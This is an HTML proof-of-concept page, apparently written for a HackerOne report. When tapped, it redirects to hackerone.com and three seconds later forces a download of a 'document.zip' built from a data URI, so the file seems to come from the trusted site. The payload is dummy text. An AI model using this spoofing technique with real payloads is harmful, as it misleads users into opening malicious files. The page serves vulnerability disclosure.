<!doctype html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Concealed Download</title>
  <style>
    body {
      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      background: #fafafa;
      cursor: pointer;
    }
    h1 {
      text-align: center;
      max-width: 420px;
    }
  </style>
</head>
<body>

<h1>
  Tap anywhere.<br>
  You will be redirected to HackerOne first, then the file will be downloaded.
</h1>

<script>
document.addEventListener('click', () => {
  // Step 1: Redirect to HackerOne first
  location.href = 'https://hackerone.com'; 

  // Step 2: After 3 seconds, trigger file download
  setTimeout(() => {
    // Create "legitimate" file content (e.g., a dummy file content for download)
    const payload = 'This is some dummy content for the zip file.';

    // Create a Data URI for the content (this will be treated as a text file for download)
    const dataUri = `data:application/zip;base64,${btoa(payload)}`;

    // Create an <a> tag to trigger the download
    const a = document.createElement('a');
    a.href = dataUri;
    a.download = 'document.zip'; // Suggested filename (ZIP file)
    document.body.appendChild(a);
    a.click(); // Trigger the download

    // Clean up after triggering the download
    setTimeout(() => {
      a.remove(); // Clean up the <a> element
    }, 1000);
  }, 3000); // Wait 3 seconds after redirect to trigger the download
}, { once: true });
</script>

</body>
</html>
